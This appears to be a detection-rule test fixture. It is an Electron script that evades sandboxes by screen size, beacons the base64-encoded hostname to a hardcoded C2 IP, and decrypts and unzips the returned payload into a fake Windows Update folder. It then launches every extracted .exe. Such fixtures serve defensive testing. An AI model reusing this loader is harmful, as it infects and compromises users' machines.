// Positive variant: renamed identifiers, different C2 IP, different paths,
// btoa-style + differently-named Base64 helper, decrypt via helper call
// (not a local ./decrypt import) to exercise the alternate any-leg.
const { execFile } = require('child_process');
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');

const C2 = 'http://45.142.212.99/sync/one.php';
const STAGE = 'C:\\Windows_Update\\SysCache';

function toB64(s) {
  return Buffer.from(String(s), 'utf8').toString('base64');
}

async function beacon(endpoint, kind, blob) {
  const qs = new URLSearchParams();
  qs.set('k', toB64(kind));
  qs.set('d', toB64(blob));
  const res = await fetch(`${endpoint}?${qs.toString()}`);
  return res.text();
}

async function deploy() {
  const os = require('os');
  const host = os.hostname();
  const disp = require('electron').screen.getPrimaryDisplay().bounds;
  if (disp.width < 1024 || disp.height < 768) {
    require('electron').app.quit();
    return;
  }
  const payload = await beacon(C2, 'fetch', host);
  const outFile = path.join(STAGE, 'update.bin.zip');
  const { decryptData } = require('./crypto-util.js');
  decryptData(payload, STAGE, outFile);
  const target = path.join(STAGE, 'w' + Date.now());
  fs.mkdirSync(target, { recursive: true });
  const archive = new AdmZip(outFile);
  archive.extractAllTo(target, true);
  fs.unlinkSync(outFile);
  const hits = [];
  (function walk(dir) {
    for (const entry of fs.readdirSync(dir)) {
      const full = path.join(dir, entry);
      if (fs.statSync(full).isDirectory()) walk(full);
      else if (path.extname(entry).toLowerCase() === '.exe') hits.push(full);
    }
  })(target);
  for (const bin of hits) {
    require('child_process').spawn(bin, { detached: true, shell: false });
  }
}

require('electron').app.whenReady().then(deploy);
